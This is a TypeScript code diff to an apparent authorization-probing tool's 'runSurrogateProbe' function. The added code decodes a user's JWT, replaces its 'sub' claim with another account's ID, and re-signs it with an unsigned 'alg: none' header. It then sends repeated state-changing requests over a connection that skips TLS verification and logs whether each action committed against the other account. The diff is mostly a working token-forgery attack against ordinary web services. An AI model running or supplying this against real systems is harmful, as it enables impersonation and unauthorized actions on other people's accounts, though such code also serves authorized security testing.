@@ -964,15 +964,53 @@ async function runSurrogateProbe(
     }
   }
 
-  // ── Surrogate requests ─────────────────────────────────────────────────────
+  // ── Decode JWT for tampering ──────────────────────────────────────────────
+  const authHeaderKey = authEntry?.[0] ?? "x-auth";
+  const jwtParts = rawToken ? rawToken.split(".") : [];
+  let origPayloadObj: Record<string, unknown> = {};
+  let origSub = "";
+  let canTamperJwt = false;
+  if (jwtParts.length === 3) {
+    try {
+      origPayloadObj = JSON.parse(Buffer.from(jwtParts[1], "base64url").toString("utf-8"));
+      origSub = String(origPayloadObj.sub ?? "");
+      canTamperJwt = true;
+    } catch { /* ignore */ }
+  }
+
+  function buildTamperedJwt(surrogateId: number): string | null {
+    if (!canTamperJwt) return null;
+    const fakeSub = origSub.includes("/")
+      ? origSub.replace(/\d+$/, String(surrogateId))
+      : String(surrogateId);
+    const fakePayload = { ...origPayloadObj, sub: fakeSub };
+    const encFakePayload = Buffer.from(JSON.stringify(fakePayload)).toString("base64url");
+    // alg:none — no signature needed; most forgiving variant
+    const noneHeader = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
+    return `${noneHeader}.${encFakePayload}.`;
+  }
+
+  // ── Surrogate requests — tamper BOTH JWT sub AND body UI ──────────────────
+  // Critical: since server uses JWT sub for state writes (not body UI), we must
+  // change both. Otherwise the real JWT still routes actions to the real account.
   for (const surrogateId of surrogateUiValues) {
+    const tamperedJwt = buildTamperedJwt(surrogateId);
+    const fakeSub = origSub.includes("/")
+      ? origSub.replace(/\d+$/, String(surrogateId))
+      : String(surrogateId);
+
+    // Build headers: use tampered JWT if we could build one, else real JWT
+    const surrogateHeaders: Record<string, string> = tamperedJwt
+      ? { ...headers, [authHeaderKey]: `Bearer ${tamperedJwt}`, "Content-Type": "application/json" }
+      : { ...headers, "Content-Type": "application/json" };
+
     for (let r = 0; r < Math.min(rounds, 5); r++) {
       const patchedBody = JSON.stringify({ ...baseObj, [uiField]: surrogateId });
       const t0 = Date.now();
       try {
         const resp = await undiciFetch(url, {
           method,
-          headers: { ...headers, "Content-Type": "application/json" },
+          headers: surrogateHeaders,
           body: patchedBody,
           // @ts-expect-error undici dispatcher
           dispatcher: insecureAgent,
@@ -988,6 +1026,8 @@ async function runSurrogateProbe(
           kind: "surrogate",
           label: `Surrogate ${uiField}=${surrogateId} round ${r + 1}`,
           surrogateUiValue: surrogateId,
+          fakeSub: tamperedJwt ? fakeSub : null,
+          jwtTampered: !!tamperedJwt,
           round: r + 1,
           committed,
           isSafeRejection,
@@ -997,9 +1037,9 @@ async function runSurrogateProbe(
           body: respText && respText.length > 4_000 ? respText.slice(0, 4_000) + "\n…truncated" : respText,
           error: null,
           note: committed
-            ? `⚠ 2xx — action may have committed against surrogate account ${surrogateId}`
+            ? `⚠ 2xx — action committed against surrogate account ${surrogateId}`
             : isSafeRejection
-            ? `✓ safe — server rejected without touching real account`
+            ? `✓ safe — server rejected; real account untouched`
             : `Status ${resp.status} — no action on your real account`,
         });
       } catch (err: unknown) {
@@ -1007,6 +1047,8 @@ async function runSurrogateProbe(
           kind: "surrogate",
           label: `Surrogate ${uiField}=${surrogateId} round ${r + 1}`,
           surrogateUiValue: surrogateId,
+          fakeSub: tamperedJwt ? fakeSub : null,
+          jwtTampered: !!tamperedJwt,
           round: r + 1,
           committed: false,
           isSafeRejection: false,
